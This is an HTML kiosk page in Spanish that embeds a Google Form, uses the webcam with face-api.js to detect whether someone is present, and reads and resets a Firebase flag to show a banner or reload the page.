<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Formulario con detección facial</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    html, body { margin:0; padding:0; height:100%; overflow:hidden; font-family:sans-serif;}
    iframe { width:100%; height:100%; border:none;}
    video, canvas { display:none; }
    #message {
      position: fixed;
      top: 30px; left: 50%;
      transform: translateX(-50%);
      background: #28c76f;
      padding: 2rem 3rem;
      border-radius: 15px;
      font-size: 2rem;
      font-weight: bold;
      color: white;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      z-index: 10000;
      display: none;
      user-select: none;
    }
  </style>
</head>
<body>

  <div id="message">¡Gracias, envíe el formulario para continuar!</div>

  <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfVGApM9zD-lNbuj08TmdPCl8KfPws1LvzWC-Cqb_3YH67_mQ/viewform?embedded=true"></iframe>

  <video id="video" autoplay muted playsinline></video>
  <canvas id="overlay"></canvas>

  <script>
    // Firebase setup
    const firebaseConfig = {
      databaseURL: "https://contador-e693c-default-rtdb.firebaseio.com/"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const video = document.getElementById('video');
    const canvas = document.getElementById('overlay');
    const ctx = canvas.getContext('2d');
    const messageBox = document.getElementById('message');

    let facePresent = false;
    let lastFaceTime = Date.now();
    let qrScanned = false;

    // Listen to qrScanned flag, show/hide green box accordingly
    db.ref("/estado/qrScanned").on("value", snapshot => {
      qrScanned = snapshot.val() === true;
      if (qrScanned) {
        messageBox.style.display = 'block';
      } else {
        messageBox.style.display = 'none';
      }
    });

    async function setupCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      return new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });
    }

    async function start() {
      await setupCamera();

      const MODEL_URL = 'https://justadudewhohacks.github.io/face-api.js/models';
      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      detectFaceLoop();
    }

    async function detectFaceLoop() {
      const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 });

      setInterval(async () => {
        const detections = await faceapi.detectAllFaces(video, options);
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        if (detections.length > 0) {
          facePresent = true;
          lastFaceTime = Date.now();
        } else {
          if (facePresent && Date.now() - lastFaceTime > 2500) {
            facePresent = false;
            // Reset qrScanned flag and reload page when user leaves
            if(qrScanned) {
              db.ref("/estado/qrScanned").set(false);
            }
            location.reload();
          }
        }
      }, 300);
    }

    start();
  </script>

</body>
</html>
